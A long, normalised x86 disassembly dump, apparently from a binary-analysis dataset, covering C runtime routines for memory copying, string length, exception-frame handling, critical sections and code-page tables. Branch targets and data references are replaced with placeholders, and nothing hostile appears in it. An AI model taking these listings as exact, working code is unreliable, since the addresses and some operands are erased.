pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a674 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a674 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a674 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a4d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a4d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a4d8 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_41a4d8 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_41a7f0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_41a87b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
test eax eax
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test [ eax ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov eax [ ecx ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] 0x1994000
sub_41a8ea
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_41a91d
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_41a953
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_4170bc
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_41c5bd
add esp 0x20
pop esi
pop ebp
retn
sub_41a984
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_4170bc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_41c5bd
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_41aa86
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41ac0a
pop ebx
leave
retn
sub_41aa21
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_41a953
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_426240
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_41aa86
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_41a984
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_4246d6
mov eax [ eax + 0x80 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x8 ]
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
sub_41ab5b
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
push esi
mov esi [ eax + 0xc ]
push edi
mov [ ebp - 0x8 ] ecx
mov edi esi
mov [ ebp - 0x4 ] esi
test ebx ebx
js r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
cmp edi [ eax + 0xc ]
ja r-xdata
mov edx [ ebp + 0x10 ]
call sub_423330
cmp esi edi
jbe r-xdata
dec esi
mov eax esi
imul eax eax 0x14
cmp [ eax + ecx + 0x4 ] edx
jge r-xdata
call sub_423330
imul esi esi 0x14
pop edi
lea eax [ ecx + esi ]
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp edx [ eax + ecx + 0x8 ]
jle r-xdata
test ebx ebx
jns r-xdata
mov edi [ ebp - 0x4 ]
dec ebx
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
sub_41abda
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_41ac0a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_41ac5d
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_4246d6
mov ecx [ eax + 0x98 ]
mov [ esi + 0x4 ] ecx
call sub_4246d6
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_41ac87
push ebp
mov ebp esp
push esi
call sub_4246d6
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_4246d6
mov ecx [ eax + 0x98 ]
jmp r-xdata
call sub_4246d6
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebp
jmp sub_423330
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
pop esi
pop ebp
retn
sub_41acd7
push ebp
mov ebp esp
call sub_4246d6
mov eax [ eax + 0x98 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_41ad00
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c5bd
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41ad36
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_41adbe
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4186ea
sub_41ad6a
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_417912
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_41adbe
push 0x8
push r--data
call sub_41ecb0
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_41eea5
push 0x1e
call sub_41ef02
push 0xff
call sub_4186d4
xor eax eax
inc eax
push 0x18
call sub_41b8d1
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_41ccf1
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_417912
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41ae5c
sub_41ae65
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_41aeaf
push 0x20
push r--data
call sub_41ecb0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov edi ebx
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov esi [ ebp + 0x8 ]
push esi
call sub_42521a
mov ebx eax
mov [ ebp + 0xc ] ebx
push edi
call sub_417912
add esp 0xc
test ebx ebx
je r-xdata
push 0x7fffffff
push esi
push ebx
push ebx
lea eax [ ebp - 0x1c ]
push eax
call sub_4264c7
add esp 0x14
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call sub_4246d6
mov [ ebp - 0x20 ] eax
mov ecx [ eax + 0x6c ]
mov [ ebp - 0x30 ] ecx
mov ecx [ eax + 0x68 ]
mov [ ebp - 0x2c ] ecx
xor edi edi
mov [ ebp - 0x1c ] edi
lea eax [ ebp - 0x30 ]
push eax
push edi
push ebx
push edi
push edi
lea eax [ ebp - 0x1c ]
push eax
call sub_42674a
add esp 0x18
test eax eax
je r-xdata
push 0x2
push [ ebp - 0x1c ]
call sub_41b887
pop ecx
pop ecx
mov edi eax
test edi edi
jne r-xdata
cmp eax 0x16
je r-xdata
call sub_41ecf5
retn
mov eax [ ebp - 0x1c ]
add eax 0x4
push eax
call sub_41b8d1
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
test edi edi
je r-xdata
cmp eax 0x16
je r-xdata
push 0xffffffff
push esi
push [ ebp - 0x1c ]
push edi
push ebx
call sub_4264c7
add esp 0x14
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
cmp eax 0x22
jne r-xdata
lea ebx [ edi + 0x4 ]
mov [ ebp - 0x28 ] ebx
lea eax [ ebp - 0x30 ]
push eax
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp - 0x1c ]
push ebx
push 0x0
call sub_42674a
add esp 0x18
test eax eax
je r-xdata
push edi
push edi
push edi
push edi
push edi
jmp r-xdata
cmp eax 0x22
jne r-xdata
cmp eax 0x16
je r-xdata
mov edi [ ebp - 0x30 ]
push 0xc
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
add esi esi
mov eax [ edi + esi * 8 + 0x18 ]
test eax eax
je r-xdata
cmp eax 0x16
je r-xdata
call sub_41f421
test eax eax
jne r-xdata
cmp eax 0x22
je r-xdata
mov eax [ ebp - 0x20 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp eax 0x22
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] eax
mov [ edi + esi * 8 + 0x18 ] ecx
mov [ edi + esi * 8 + 0x10 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b07e
mov eax ebx
test [ rw-data ] 0x1
jne r-xdata
push [ edi + esi * 8 + 0x18 ]
call sub_417912
pop ecx
test eax eax
jne r-xdata
push edi
call sub_417912
pop ecx
jmp r-xdata
mov eax [ edi + esi * 8 + 0x18 ]
test eax eax
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
push [ edi + esi * 8 + 0x18 ]
call sub_417912
pop ecx
sub_41b0b0
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_426813
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41b100
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_426813
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41b150
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_426813
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41b1a0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41b0b0
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
sub_41b1cb
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41b100
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
pop ebp
retn
sub_41b1f6
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41b150
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
pop ebp
retn
sub_41b221
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push edi
push [ ebp + 0x8 ]
call sub_41cd45
lea edi [ eax + 0x1 ]
push 0x2
push edi
call sub_4268c2
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
xor eax eax
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
push edi
push ebx
call sub_417a48
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
mov eax ebx
jmp r-xdata
pop edi
pop ebx
pop ebp
retn
sub_41b2c2
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x2c ] ebx
mov eax [ esi + 0xa8 ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] ebx
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push edi
lea edi [ esi + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ esi + 0x88 ] ebx
mov [ esi + 0x8c ] ebx
mov [ esi + 0x90 ] r--data
mov [ esi + 0x94 ] r--data
mov [ esi + 0x98 ] r--data
mov [ esi + 0x74 ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_41b8d1
push 0x2
push 0x180
mov [ ebp - 0x2c ] eax
call sub_41b887
push 0x1
push 0x180
mov [ ebp - 0x20 ] eax
call sub_41b887
push 0x1
push 0x180
mov [ ebp - 0x24 ] eax
call sub_41b887
push 0x1
push 0x101
mov [ ebp - 0x1c ] eax
call sub_41b887
mov ecx eax
mov eax [ ebp - 0x2c ]
add esp 0x24
mov [ ebp - 0x28 ] ecx
test eax eax
je r-xdata
push edi
push 0x1004
push eax
lea eax [ ebp - 0x44 ]
push ebx
push eax
call sub_41f0bd
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_417912
push [ ebp - 0x20 ]
call sub_417912
push [ ebp - 0x24 ]
call sub_417912
push [ ebp - 0x1c ]
call sub_417912
xor ebx ebx
add esp 0x10
inc ebx
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
test ecx ecx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov [ eax ] ebx
mov eax ebx
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ edi ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax 0x5
ja r-xdata
mov ecx [ ebp - 0x28 ]
push ebx
push [ edi ]
movzx eax ax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x24 ]
mov edx 0xff
push edx
add eax 0x81
push eax
push edx
inc ecx
push ecx
push 0x100
push [ esi + 0xa8 ]
mov [ ebp - 0x34 ] ecx
push ebx
call sub_41b843
add esp 0x24
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push [ edi ]
mov ecx 0xff
push ecx
add eax 0x81
push eax
push ecx
push [ ebp - 0x34 ]
push 0x200
push [ esi + 0xa8 ]
push ebx
call sub_41b843
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x1
jle r-xdata
mov eax [ ebp - 0x20 ]
push ebx
push [ edi ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x28 ]
push 0x1
push ebx
call sub_4269ec
add esp 0x1c
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov edi [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov [ edi + 0xfe ] cx
mov ecx [ ebp - 0x24 ]
sub ecx 0xffffff80
mov [ ecx - 0x1 ] bl
mov [ eax + 0x7f ] bl
sub eax 0xffffff80
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] bl
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
mov [ eax ] bl
jle r-xdata
mov edi [ ebp - 0x28 ]
lea ecx [ ebp - 0x11 ]
push 0xfe
lea eax [ edi + 0x200 ]
push eax
push edi
call sub_41a1a0
mov ecx [ ebp - 0x24 ]
push 0x7f
lea eax [ ecx + 0x100 ]
push eax
push ecx
call sub_41a1a0
mov ecx [ ebp - 0x1c ]
push 0x7f
